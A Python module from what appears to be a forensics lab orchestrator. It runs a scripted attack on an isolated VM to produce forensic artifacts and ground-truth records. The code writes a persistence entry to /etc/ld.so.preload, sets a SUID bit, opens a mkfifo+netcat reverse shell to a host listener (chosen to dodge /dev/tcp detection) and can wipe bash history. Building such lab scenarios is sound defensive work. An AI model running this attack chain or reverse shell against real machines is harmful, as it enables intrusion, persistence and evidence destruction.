"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01: Userland LD_PRELOAD + PrivEsc + Reverse Shell + Cleanup

Steps
-----
1. Discovery      T1082     - system info collection (best-effort)
2. LD_PRELOAD     T1574.006 - write /etc/ld.so.preload (prereq compile + exec)
3. SUID PrivEsc   T1548.001 - set SUID bit on a test binary
4. Reverse shell  T1059.004 - hand-rolled (not via ART); see _run_reverse_shell
5. Cleanup        T1070.003 - clear bash history (only if run_cleanup=True)

Ground-truth shape
------------------
run() returns {"steps": [...]} (orchestrator stamps "scenario_id" on top).
Step entries are heterogeneous by design:
  - ART steps (1, 2, 3, 5):  {step, guid, name, exit_code, stdout, stderr}
  - reverse_shell:           {step, exit_code, connected, id_output, error}
  - cleanup (skipped path):  {step, run: False}

Forensic artifacts generated
-----------------------------
Disk:
  /etc/ld.so.preload        - persistence entry (removed by cleanup only if called)
  /tmp/T1574006.so          - compiled malicious shared library
  /tmp/atomics/T1574.006/   - source tree uploaded by ArtRunner for prereq compile
  /tmp/T1548001_test        - SUID binary
  modified atime on /etc/ld.so.preload
  ~/.bash_history            - if cleanup NOT run: contains all commands above
                             - if cleanup IS run: file absent or truncated

Memory:
  gcc process (during prereq)
  sh -c 'echo ... > /etc/ld.so.preload' (T1574.006 executor)
  ld.so.preload loaded in subsequent processes after step 2
  nc / bash reverse shell process and its socket (step 4)
  env variable LD_PRELOAD may appear in /proc/<pid>/environ of shell
"""

from __future__ import annotations

import logging
import socket
import threading
import time
from typing import Any

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient

_log = logging.getLogger(__name__)

# --- ART test identifiers ------------------------------------------------

_DISCOVERY_T = "T1082"
_DISCOVERY_G = (
    "354a8eac-0813-4f27-8b21-1e1c1e5a1af1"  # System Information Discovery via uname
)

_LDPRELOAD_T = "T1574.006"
_LDPRELOAD_G = "39cb0e67-dd0d-4b74-a74b-c072db7ae991"  # via /etc/ld.so.preload

_SUID_T = "T1548.001"
_SUID_G = "6578d943-9303-4e89-8a57-2f40a36f68e7"  # setuid via chmod

_CLEANUP_T = "T1070.003"
_CLEANUP_G = "a934276e-2be5-4a36-93fd-98adbb5bd4fc"  # rm ~/.bash_history

# Reverse shell config (host-side listener)
_REVSHELL_PORT = 4444
_REVSHELL_TIMEOUT = 10  # seconds to wait for connection


# --- public entry point --------------------------------------------------


def run(
    ssh: SSHClient,
    runner: ArtRunner,
    host_ip: str,
    internet_on,
    internet_off,
    *,
    run_cleanup: bool = False,
) -> dict[str, Any]:
    """
    Execute scenario 01 steps in sequence.

    Returns a ground-truth dict describing what was executed. The orchestrator
    stamps the canonical scenario_id onto the returned dict, so this function
    does not embed any identifier of its own.

    Raises RuntimeError if a mandatory step fails.
    """
    ground_truth: dict[str, Any] = {"steps": []}
    steps = ground_truth["steps"]

    # Step 1: Discovery (best-effort, failure is acceptable)
    _log.info("[1/5] discovery")
    result = runner.run_test(_DISCOVERY_T, _DISCOVERY_G, raise_on_error=False)
    steps.append({"step": "discovery", **result})

    # Step 2: LD_PRELOAD persistence
    # The current T1574.006 prereq compiles a .so locally (offline-safe today)
    # but we still bracket it with internet_on/off as a convention so future
    # scenarios whose prereqs `wget`/`curl` assets work without code changes.
    _log.info("[2/5] LD_PRELOAD persistence")
    internet_on()
    try:
        runner.run_prerequisites(_LDPRELOAD_T, _LDPRELOAD_G, timeout=60)
    finally:
        internet_off()
    result = runner.run_test(_LDPRELOAD_T, _LDPRELOAD_G)
    steps.append({"step": "ldpreload", **result})

    # Step 3: SUID privilege escalation
    _log.info("[3/5] SUID privesc")
    result = runner.run_test(_SUID_T, _SUID_G, raise_on_error=False)
    steps.append({"step": "suid_privesc", **result})

    # Step 4: Reverse shell (host listener + ART one-liner on VM)
    _log.info("[4/5] reverse shell")
    result = _run_reverse_shell(ssh, host_ip)
    steps.append({"step": "reverse_shell", **result})

    # Step 5: Cleanup (optional - set run_cleanup=False to preserve artifacts)
    if run_cleanup:
        _log.info("[5/5] cleanup: history clear + LD_PRELOAD removal")
        runner.run_test(_CLEANUP_T, _CLEANUP_G, raise_on_error=False)
        runner.run_cleanup(_LDPRELOAD_T, _LDPRELOAD_G)
        steps.append({"step": "cleanup", "run": True})
    else:
        _log.info("[5/5] cleanup: skipped (artifacts preserved for forensics)")
        steps.append({"step": "cleanup", "run": False})

    return ground_truth


# --- reverse shell helpers -----------------------------------------------


def _run_reverse_shell(ssh: SSHClient, host_ip: str) -> dict[str, Any]:
    """
    Start a netcat listener on the host, trigger mkfifo+nc reverse shell on
    the VM, capture one line of output to confirm the connection.

    The shell is immediately killed after confirmation; we only need to
    record that the connection was established and leave memory artifacts.

    host_ip: the libvirt isolated-network gateway as the VM sees it (i.e. the
    address the lab VM uses to reach the orchestrator process). See
    config.ISOLATED_NETWORK_GATEWAY.
    """
    # `received` and `error` are mutated from the listener thread below.
    received: list[str] = []
    error: list[str] = []

    def _listen() -> None:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", _REVSHELL_PORT))
                srv.listen(1)
                srv.settimeout(_REVSHELL_TIMEOUT)
                conn, addr = srv.accept()
                console.ok(f"reverse shell connected from {addr}")
                conn.sendall(b"id\n")
                time.sleep(0.5)
                data = conn.recv(4096)
                received.append(data.decode(errors="replace").strip())
                conn.sendall(b"exit\n")
                conn.close()
        except Exception as exc:
            error.append(str(exc))

    # The listener runs in a background thread so it can be bound and accepting
    # BEFORE the VM-side `nc` is triggered below; otherwise the VM connects
    # to a closed port and the reverse shell dies before we can read from it.
    listener = threading.Thread(target=_listen, daemon=True)
    listener.start()
    time.sleep(0.3)  # let bind() settle before triggering the VM side

    # mkfifo + nc reverse shell (no /dev/tcp to avoid bash built-in detection)
    fifo = "/tmp/.rs_fifo"
    cmd = (
        f"rm -f {fifo}; mkfifo {fifo}; "
        f"cat {fifo} | /bin/sh -i 2>&1 | nc {host_ip} {_REVSHELL_PORT} > {fifo} &"
    )
    code, out, err = ssh.run(cmd, timeout=15)

    listener.join(timeout=_REVSHELL_TIMEOUT + 2)

    if error:
        console.warn(f"reverse shell listener error: {error[0]}")
    elif not received:
        console.warn("reverse shell: no data received (connection may have failed)")
    else:
        console.ok(f"reverse shell id output: {received[0]}")

    return {
        "exit_code": code,
        "connected": bool(received),
        "id_output": received[0] if received else "",
        "error": error[0] if error else "",
    }
